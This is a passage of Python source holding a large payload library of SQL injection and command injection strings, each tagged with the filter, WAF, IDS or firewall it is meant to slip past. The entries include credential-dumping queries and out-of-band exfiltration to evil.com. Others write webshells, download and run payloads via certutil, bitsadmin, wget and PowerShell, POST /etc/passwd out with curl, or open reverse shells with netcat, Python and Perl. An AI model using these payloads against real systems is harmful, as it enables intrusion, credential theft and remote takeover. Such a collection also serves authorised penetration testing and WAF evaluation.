        'sqli_case_when': {
            'payload': "' AND CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END--",
            'description': 'CASE WHEN conditional time-based blind',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # OOB SQLi
        'sqli_oob_dns_mysql': {
            'payload': "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.evil.com\\\\test'))--",
            'description': 'MySQL OOB DNS exfiltration',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'sqli_oob_dns_mssql': {
            'payload': "'; EXEC master..xp_dirtree '\\\\evil.com\\share'--",
            'description': 'MSSQL OOB DNS via xp_dirtree',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        # Auth bypass
        'sqli_auth_bypass_admin': {
            'payload': "admin'--",
            'description': 'Authentication bypass for admin account',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'critical'
        },
        'sqli_auth_bypass_or': {
            'payload': "' OR '1'='1' --",
            'description': 'Classic auth bypass OR condition',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'critical'
        },
        'sqli_auth_bypass_not_exist': {
            'payload': "' OR NOT EXISTS(SELECT * FROM users WHERE 1=2)--",
            'description': 'Auth bypass using NOT EXISTS',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'sqli_group_by_error': {
            'payload': "' GROUP BY CONCAT(version(),0x3a,FLOOR(RAND(0)*2)) HAVING MIN(0)--",
            'description': 'MySQL GROUP BY error-based injection',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_having_clause': {
            'payload': "' HAVING 1=1--",
            'description': 'HAVING clause injection',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'sqli_into_dumpfile': {
            'payload': "' UNION SELECT 1,2,3 INTO DUMPFILE '/var/www/html/dump.txt'--",
            'description': 'MySQL INTO DUMPFILE for file write',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mysql_information_schema_columns': {
            'payload': "' UNION SELECT column_name,table_name,3 FROM information_schema.columns WHERE table_schema!=0x696e666f726d6174696f6e5f736368656d61--",
            'description': 'Enumerate all non-system columns',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mysql_group_concat_creds': {
            'payload': "' UNION SELECT GROUP_CONCAT(username,':',password SEPARATOR '<br>'),NULL FROM users--",
            'description': 'Dump all credentials with GROUP_CONCAT',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_truncation': {
            'payload': "admin                                                               '",
            'description': 'SQL truncation attack for auth bypass',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'sqli_procedure_analyse': {
            'payload': "' PROCEDURE ANALYSE()--",
            'description': 'MySQL PROCEDURE ANALYSE info leak',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'sqli_mysql_user_table': {
            'payload': "' UNION SELECT user,password,3 FROM mysql.user--",
            'description': 'Read MySQL user password hashes',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_pgsql_pg_user': {
            'payload': "' UNION SELECT usename,passwd,3 FROM pg_shadow--",
            'description': 'PostgreSQL pg_shadow password dump',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mssql_servername': {
            'payload': "' UNION SELECT @@SERVERNAME,NULL,NULL--",
            'description': 'MSSQL server name extraction',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'sqli_mssql_linked_servers': {
            'payload': "' UNION SELECT name,NULL,NULL FROM sys.servers--",
            'description': 'MSSQL linked servers enumeration',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mssql_is_srvrolemember': {
            'payload': "' UNION SELECT IS_SRVROLEMEMBER('sysadmin'),NULL,NULL--",
            'description': 'Check MSSQL sysadmin role membership',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'sqli_oob_http_mysql': {
            'payload': "' UNION SELECT NULL INTO OUTFILE '\\\\\\\\evil.com\\\\share\\\\test'--",
            'description': 'MySQL OOB via UNC path INTO OUTFILE',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'sqli_waf_buffer_overflow': {
            'payload': "' OR 1=1" + " " * 1000 + "--",
            'description': 'Buffer padding to overflow WAF inspection',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'sqli_multiline_comment': {
            'payload': "' OR /*\n*/1=1--",
            'description': 'Multiline comment with newline',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_bypass_addslashes': {
            'payload': "\\' OR 1=1--",
            'description': 'Bypass addslashes() with backslash',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'sqli_numeric_hex': {
            'payload': "' OR 0x313d31--",
            'description': 'Hex-encoded condition in injection',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'sqli_mod_security_bypass': {
            'payload': "'||pg_sleep(5)--",
            'description': 'PostgreSQL sleep via concatenation operator',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_version_comment': {
            'payload': "' /*!OR*/ 1=1--",
            'description': 'MySQL version conditional comment',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mysql_specific_comment': {
            'payload': "' /*!50000OR*/ 1=1--",
            'description': 'MySQL >= 5.00.00 conditional comment',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_blind_regexp': {
            'payload': "' AND password REGEXP '^a'--",
            'description': 'Blind SQLi via REGEXP operator',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_blind_in': {
            'payload': "' AND 1 IN (SELECT IF(1=1,1,0))--",
            'description': 'Blind SQLi via IN subquery',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_error_extractvalue_v2': {
            'payload': "' AND EXTRACTVALUE(0,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))--",
            'description': 'Error-based table enumeration via EXTRACTVALUE',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_insert_injection': {
            'payload': "test', 1, (SELECT password FROM users WHERE username='admin'), '1",
            'description': 'SQL injection in INSERT statement',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_update_injection': {
            'payload': "test' WHERE 1=1 OR '1'='1",
            'description': 'SQL injection in UPDATE statement',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_delete_injection': {
            'payload': "1 OR 1=1",
            'description': 'SQL injection in DELETE statement',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_union_strings_concat': {
            'payload': "' UNION SELECT 'a'||'d'||'m'||'i'||'n',NULL,NULL--",
            'description': 'UNION SELECT with string concatenation',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_subquery': {
            'payload': "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(user(),0x3a,FLOOR(RAND()*2))a FROM information_schema.tables GROUP BY a)b)--",
            'description': 'Error-based via subquery technique',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_pgsql_copy_from': {
            'payload': "'; COPY users TO '/tmp/users.csv'--",
            'description': 'PostgreSQL COPY TO for file write',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_oracle_xmltype': {
            'payload': "' UNION SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://evil.com/\">%remote;]>'),'/l'),NULL FROM dual--",
            'description': 'Oracle XXE via XMLType for OOB',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'sqli_format_bypass': {
            'payload': "%27+OR+%271%27%3D%271",
            'description': 'URL-encoded with + as space bypass',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_bypass_quotes': {
            'payload': "' OR 1 LIKE 1--",
            'description': 'Quote bypass using LIKE instead of =',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'sqli_bypass_between': {
            'payload': "' OR 1 BETWEEN 1 AND 1--",
            'description': 'BETWEEN operator bypass',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'sqli_bypass_is': {
            'payload': "' OR 1 IS NOT NULL--",
            'description': 'IS NOT NULL operator bypass',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'sqli_double_query': {
            'payload': "' UNION SELECT NULL,(SELECT password FROM users LIMIT 1),NULL--",
            'description': 'Nested SELECT for credential extraction',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_no_quote_int': {
            'payload': "1 UNION SELECT 1,user(),3",
            'description': 'UNION injection in integer parameter (no quote)',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mysql_fulltext': {
            'payload': "' OR MATCH(username) AGAINST ('admin' IN BOOLEAN MODE)--",
            'description': 'MySQL fulltext search injection',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'sqli_field_truncation': {
            'payload': "admin' -- -",
            'description': 'Field truncation auth bypass (dash-space-dash)',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'sqli_mysql_now': {
            'payload': "' OR NOW() > '2000-01-01'--",
            'description': 'MySQL NOW() function in condition',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'sqli_pgsql_string_concat': {
            'payload': "' OR username = 'ad'||'min'--",
            'description': 'PostgreSQL string concatenation operator',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mysql_weight_string': {
            'payload': "' UNION SELECT WEIGHT_STRING(password LEVEL 1), NULL, NULL FROM users--",
            'description': 'MySQL WEIGHT_STRING for collation attack',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_limit_offset': {
            'payload': "' LIMIT 1 OFFSET 0--",
            'description': 'LIMIT/OFFSET injection for row enumeration',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'sqli_null_byte_filter': {
            'payload': "'%00 OR '1'='1",
            'description': 'Null byte to terminate string check',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mssql_print': {
            'payload': "'; PRINT @@VERSION--",
            'description': 'MSSQL PRINT for output in errors',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'sqli_mssql_dbname': {
            'payload': "' UNION SELECT DB_NAME(),NULL,NULL--",
            'description': 'MSSQL current database name',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'sqli_oracle_rownum': {
            'payload': "' UNION SELECT username,password,3 FROM dba_users WHERE ROWNUM=1--",
            'description': 'Oracle DBA users table access',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_sqlite_version': {
            'payload': "' UNION SELECT sqlite_version(),NULL,NULL--",
            'description': 'SQLite version extraction',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'sqli_sqlite_tables': {
            'payload': "' UNION SELECT name,sql,3 FROM sqlite_master WHERE type='table'--",
            'description': 'SQLite table enumeration via sqlite_master',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_json_path': {
            'payload': "' UNION SELECT JSON_EXTRACT(column,'$.password'),NULL,NULL FROM users--",
            'description': 'MySQL JSON_EXTRACT for JSON column injection',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_pgsql_jsonb': {
            'payload': "' UNION SELECT data->>'password',NULL,NULL FROM users--",
            'description': 'PostgreSQL JSONB operator extraction',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mssql_xml_path': {
            'payload': "' UNION SELECT (SELECT username+':'+password FROM users FOR XML PATH(''))--",
            'description': 'MSSQL FOR XML PATH to concatenate results',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        }
    }
    
    # Command Injection Bypass Payloads
    COMMAND_INJECTION_PAYLOADS = {
        'cmd_semicolon': {
            'payload': '; ls -la',
            'description': 'Semicolon command separator',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_pipe': {
            'payload': '| whoami',
            'description': 'Pipe operator',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_ampersand': {
            'payload': '& ipconfig',
            'description': 'Ampersand separator (Windows)',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_backticks': {
            'payload': '`whoami`',
            'description': 'Backtick command substitution',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_dollar_paren': {
            'payload': '$(whoami)',
            'description': 'Dollar parenthesis substitution',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_newline': {
            'payload': '\nwhoami',
            'description': 'Newline separator',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_double_pipe': {
            'payload': '|| cat /etc/passwd',
            'description': 'OR operator',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_double_ampersand': {
            'payload': '&& ls -la',
            'description': 'AND operator',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_encoded_semicolon': {
            'payload': '%3b+ls+-la',
            'description': 'URL encoded semicolon',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_wildcard_chars': {
            'payload': '/b??/c?t /etc/passwd',
            'description': 'Wildcard character obfuscation',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'cmd_slash_separation': {
            'payload': r'/usr/b\in/wh\oami',
            'description': 'Backslash separation',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'cmd_hex_encoding': {
            'payload': '\\x77\\x68\\x6f\\x61\\x6d\\x69',
            'description': 'Hex encoded command',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_base64': {
            'payload': 'echo d2hvYW1p | base64 -d | sh',
            'description': 'Base64 encoded command',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'cmd_variable_expansion': {
            'payload': '$HOME/../../../etc/passwd',
            'description': 'Variable expansion',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_comment': {
            'payload': '| whoami #',
            'description': 'Comment to ignore rest',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # Windows command injection
        'cmd_win_dir': {
            'payload': '& dir',
            'description': 'Windows dir command',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_win_net_user': {
            'payload': '& net user',
            'description': 'Windows net user enumeration',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_win_systeminfo': {
            'payload': '| systeminfo',
            'description': 'Windows system information',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_win_type': {
            'payload': '& type C:\\Windows\\win.ini',
            'description': 'Windows file read via type',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_win_echo_web': {
            'payload': '& echo ^<?php system($_GET[cmd]);?^> > C:\\inetpub\\wwwroot\\shell.php',
            'description': 'Windows write webshell',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_win_certutil': {
            'payload': '& certutil -urlcache -f http://evil.com/shell.exe C:\\Temp\\shell.exe',
            'description': 'Windows file download via certutil',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.IPS,
            'risk_level': 'critical'
        },
        'cmd_win_bitsadmin': {
            'payload': '& bitsadmin /transfer job http://evil.com/shell.exe C:\\Temp\\shell.exe',
            'description': 'Windows file download via bitsadmin',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.IPS,
            'risk_level': 'critical'
        },
        # PowerShell injection
        'cmd_ps_basic': {
            'payload': '; powershell -c whoami',
            'description': 'PowerShell command injection',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_ps_encoded': {
            'payload': '; powershell -enc dwBoAG8AYQBtAGkA',
            'description': 'PowerShell base64 encoded command',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'cmd_ps_bypass_exec': {
            'payload': '; powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/payload.ps1\')"',
            'description': 'PowerShell download and execute',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.IPS,
            'risk_level': 'critical'
        },
        'cmd_ps_hidden': {
            'payload': '; powershell -WindowStyle Hidden -Command "whoami"',
            'description': 'PowerShell hidden window',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'cmd_ps_iex': {
            'payload': '; powershell -c "IEX(\'calc.exe\')"',
            'description': 'PowerShell Invoke-Expression',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # Linux bash techniques
        'cmd_bash_redirect': {
            'payload': '; cat /etc/passwd > /tmp/out',
            'description': 'Output redirection',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_bash_tee': {
            'payload': '| id | tee /tmp/out',
            'description': 'Using tee for output capture',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'cmd_bash_proc_self': {
            'payload': '; cat /proc/self/environ',
            'description': 'Read process environment variables',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_bash_proc_cmdline': {
            'payload': '; cat /proc/1/cmdline',
            'description': 'Read init process cmdline',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'cmd_bash_curl_exfil': {
            'payload': '| curl -d "$(cat /etc/passwd)" http://evil.com',
            'description': 'Exfiltrate file via curl POST',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.IPS,
            'risk_level': 'critical'
        },
        'cmd_bash_wget_shell': {
            'payload': '; wget -O /tmp/shell http://evil.com/shell.sh && chmod +x /tmp/shell && /tmp/shell',
            'description': 'Download and execute reverse shell',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.IPS,
            'risk_level': 'critical'
        },
        'cmd_bash_mkfifo': {
            'payload': '; mkfifo /tmp/p && nc evil.com 4444 </tmp/p | /bin/bash >/tmp/p',
            'description': 'Reverse shell via named pipe',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'cmd_bash_python_revshell': {
            'payload': '; python3 -c \'import socket,subprocess;s=socket.socket();s.connect(("evil.com",4444));subprocess.call(["/bin/bash"],stdin=s,stdout=s,stderr=s)\'',
            'description': 'Python reverse shell',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'cmd_bash_perl_revshell': {
            'payload': '; perl -e \'use Socket;$i="evil.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh")\'',
            'description': 'Perl reverse shell',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        # IFS manipulation
        'cmd_ifs_bypass': {
            'payload': '${IFS}cat${IFS}/etc/passwd',
            'description': 'IFS variable for space bypass',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_ifs_semicolon': {
            'payload': ';${IFS}id',
            'description': 'IFS with semicolon separator',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_ifs_custom': {
            'payload': 'IFS=,;cmd=\'cat,/etc/passwd\';$cmd',
            'description': 'Custom IFS delimiter injection',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        # Brace expansion
        'cmd_brace_expand': {
            'payload': '{ls,-la}',
            'description': 'Brace expansion for command with args',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_brace_cat': {
            'payload': ';{cat,/etc/passwd}',
            'description': 'Brace expansion to avoid spaces',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        # Environment variable manipulation
        'cmd_env_var_bypass': {
            'payload': ';$CMD',
            'description': 'Environment variable expansion injection',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'cmd_path_var': {
            'payload': ';/usr/bin/id',
            'description': 'Full path command execution',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'cmd_env_concat': {
            'payload': ';$\'\\x69\\x64\'',
            'description': 'ANSI-C quoting for command obfuscation',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        # Wildcard/glob abuse
        'cmd_wildcard': {
            'payload': '; /???/??t /???/p????d',
            'description': 'Wildcard glob matching for /bin/cat /etc/passwd',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_wildcard_2': {
            'payload': '; /bin/c?t /etc/pass?d',
            'description': 'Partial wildcard matching',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        # Encoding methods
        'cmd_base64_decode': {
            'payload': '; echo aWQ= | base64 -d | bash',
            'description': 'Base64 encoded command execution',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'high'
        },
        'cmd_hex_decode': {
            'payload': '; printf "\\x69\\x64" | bash',
            'description': 'Hex encoded command execution via printf',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'high'
        },
        'cmd_octal_decode': {
            'payload': '; printf "\\151\\144" | bash',
            'description': 'Octal encoded command execution via printf',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'high'
        },
        # Subshell variations
        'cmd_subshell_backtick': {
            'payload': '`whoami`',
            'description': 'Backtick subshell execution',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_subshell_dollar': {
            'payload': '$(whoami)',
            'description': 'Dollar sign subshell execution',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_subshell_nested': {
            'payload': '$($(whoami))',
            'description': 'Nested subshell execution',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        # OS-specific targets
        'cmd_linux_shadow': {
            'payload': '; cat /etc/shadow',
            'description': 'Read shadow password file',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_linux_hostname': {
            'payload': '; hostname -I',
            'description': 'Get internal IP addresses',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'cmd_linux_crontab': {
            'payload': '; crontab -l',
            'description': 'List cron jobs',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_linux_sudo_list': {
            'payload': '; sudo -l',
            'description': 'List sudo permissions',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_linux_find_suid': {
            'payload': '; find / -perm -4000 -type f 2>/dev/null',
            'description': 'Find SUID files',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_pipe_tee_output': {
            'payload': '| tee /tmp/x',
            'description': 'Redirect command output to file',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'cmd_and_and': {
            'payload': '&& id',
            'description': 'Double ampersand conditional execution',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_or_or': {
            'payload': '|| id',
            'description': 'Double pipe OR conditional execution',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_newline_separator': {
            'payload': '%0aid',
            'description': 'URL-encoded newline as command separator',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_cr_separator': {
            'payload': '%0did',
            'description': 'Carriage return as command separator',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_crlf_separator': {
            'payload': '%0d%0aid',
            'description': 'CRLF as command separator',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_double_pipe_waf': {
            'payload': '||id||',
            'description': 'Double pipe with trailing bypass',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_null_byte': {
            'payload': '%00;id',
            'description': 'Null byte before separator',
            'category': PayloadCategory.COMMAND_INJECTION,
